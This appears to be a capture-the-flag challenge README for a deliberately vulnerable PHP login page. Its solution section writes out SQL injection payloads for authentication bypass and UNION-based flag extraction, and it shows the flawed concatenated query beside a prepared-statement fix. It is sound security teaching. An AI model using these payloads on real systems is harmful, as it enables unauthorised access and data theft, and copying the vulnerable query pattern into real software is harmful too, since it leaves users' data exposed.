# SQL Injection Challenge

## Challenge Overview

**Difficulty:** Beginner to Intermediate  
**Category:** Web Security  
**Points:** 200  

## Description

This challenge simulates a login system with a SQL injection vulnerability. Your task is to exploit this vulnerability to bypass authentication, access the admin panel, and retrieve the hidden flag.

## Learning Objectives

- Understand how SQL injection vulnerabilities occur
- Learn different SQL injection techniques
- Practice bypassing authentication mechanisms
- Understand how to extract data from databases using SQL injection
- Learn about proper security measures to prevent SQL injection

## Setup Instructions

### Prerequisites

- PHP (7.0 or higher)
- MySQL/MariaDB database
- Web server (Apache, Nginx, etc.)

### Installation

1. Set up a web server with PHP and MySQL
2. Create a database user with the following credentials:
   - Username: `ctf_user`
   - Password: `ctf_password`
3. Place the challenge files in your web server's document root
4. Access the challenge through your web browser

**Note:** The application will automatically create the necessary database and tables when first accessed.

## Challenge Tasks

1. **Basic Authentication Bypass:** Login to the application without knowing any valid credentials
2. **Targeted Authentication:** Login specifically as the admin user
3. **Data Extraction:** Extract the secret flag from the database

## Hints

1. Think about how the application might construct its SQL query for authentication
2. SQL comments can be useful to ignore parts of a query
3. The `UNION` operator can be used to combine the results of multiple `SELECT` statements
4. Try to determine the database structure by examining error messages or through blind techniques
5. The flag is stored in a table called `secret_flags`

## Solution

<details>
<summary>Click to reveal the solution</summary>

### Basic Authentication Bypass

Input in the username field:
```
' OR '1'='1
```

Leave the password field empty or enter anything.

This works because the resulting SQL query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Since `'1'='1'` is always true, this returns all users in the database.

### Login as Admin

Input in the username field:
```
admin' --
```

Leave the password field empty or enter anything.

This works because the resulting SQL query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

The `--` comments out the rest of the query, so the password check is ignored.

### Extract the Flag

Input in the username field:
```
' UNION SELECT 'admin' as username, 'hack' as password, 1 as id FROM secret_flags WHERE flag_name = 'main_flag' --
```

This works because the resulting SQL query becomes:
```sql
SELECT * FROM users WHERE username = '' UNION SELECT 'admin' as username, 'hack' as password, 1 as id FROM secret_flags WHERE flag_name = 'main_flag' -- ' AND password = 'anything'
```

This query returns a result with the username 'admin', allowing access to the admin panel where the flag is displayed.

Alternatively, you can extract the flag directly:

```
' UNION SELECT 1, flag_value, 3 FROM secret_flags WHERE flag_name = 'main_flag' --
```

### Explanation

The vulnerability exists because the application directly concatenates user input into the SQL query without proper sanitization or parameterization:

```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

To fix this vulnerability, the application should use prepared statements:

```php
// Prepare statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");

// Bind parameters
$stmt->bind_param("ss", $username, $password);

// Execute query
$stmt->execute();

// Get result
$result = $stmt->get_result();
```

</details>

## Prevention

To prevent SQL injection vulnerabilities in real applications:

1. Use prepared statements with parameterized queries
2. Apply input validation and sanitization
3. Implement the principle of least privilege for database users
4. Use ORM (Object-Relational Mapping) frameworks
5. Enable proper error handling to avoid leaking database information

## Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Tutorial](https://portswigger.net/web-security/sql-injection)
- [MySQL Documentation on Prepared Statements](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)